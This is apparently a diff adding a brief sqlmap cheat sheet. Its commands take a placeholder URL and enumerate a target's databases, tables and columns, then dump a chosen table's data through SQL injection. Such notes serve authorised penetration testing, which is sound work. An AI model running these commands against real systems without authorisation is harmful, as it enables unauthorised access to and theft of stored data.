@@ -1,0 +1,13 @@
+NOTE: **Anything inside of the ## is a variable**
+To Get List of Databases:
+    sqlmap -u "#URL#" --dbs
+
+To Get List of Tables:
+    sqlmap -u "#URL#" --tables -D 'database_name'
+
+To Get the Columns of a particular table:
+    sqlmap -u "#URL#" --columns -D #database_name# -T #table_name#
+
+To Dump the data of a particular table:
+    sqlmap -u "#URL#" --dump -D #database_name# -T #table_name#
+
